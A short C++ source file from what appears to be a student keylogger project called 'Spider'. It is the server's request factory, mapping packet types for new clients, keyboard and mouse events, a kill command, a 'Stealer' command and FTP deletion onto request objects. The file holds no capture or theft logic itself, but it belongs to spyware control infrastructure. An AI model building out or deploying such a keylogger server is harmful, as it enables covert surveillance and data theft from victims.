//
// RequestBuilder.cpp for server in /home/galibe_s/rendu/Spider/server/core/request
//
// Made by stephane galibert
// Login   <galibe_s@epitech.net>
//
// Started on  Sat Nov  5 15:54:01 2016 stephane galibert
// Last update Tue Nov  8 18:03:10 2016 stephane galibert
//

#include "RequestBuilder.hpp"

RequestBuilder::RequestBuilder(void)
{
  _cmds[(int)PacketType::PT_NewClient] = std::bind(&RequestBuilder::nc, this);
  _cmds[(int)PacketType::PT_KeyboardEvent] = std::bind(&RequestBuilder::key, this);
  _cmds[(int)PacketType::PT_MouseEvent] = std::bind(&RequestBuilder::key, this);
  _cmds[(int)PacketType::PT_Kill] = std::bind(&RequestBuilder::exit, this);
  _cmds[(int)PacketType::PT_Stealer] = std::bind(&RequestBuilder::stealer, this);
  _cmds[(int)PacketType::PT_DeleteFTP] = std::bind(&RequestBuilder::deleteftp, this);
}

RequestBuilder::~RequestBuilder(void)
{
}

std::unique_ptr<IRequest> RequestBuilder::create(PacketType type) const
{
  if (_cmds.find((int)type) != _cmds.cend()) {
    return (std::move(_cmds.at((int)type)()));
  }
  return (NULL);
}

std::unique_ptr<IRequest> RequestBuilder::nc(void) const
{
  return (std::unique_ptr<IRequest>(new Nc));
}

std::unique_ptr<IRequest> RequestBuilder::key(void) const
{
  return (std::unique_ptr<IRequest>(new Key));
}

std::unique_ptr<IRequest> RequestBuilder::exit(void) const
{
  return (std::unique_ptr<IRequest>(new Exit));
}

std::unique_ptr<IRequest> RequestBuilder::stealer(void) const
{
  return (std::unique_ptr<IRequest>(new Stealer));
}

std::unique_ptr<IRequest> RequestBuilder::deleteftp(void) const
{
  return (std::unique_ptr<IRequest>(new DeleteFTP));
}
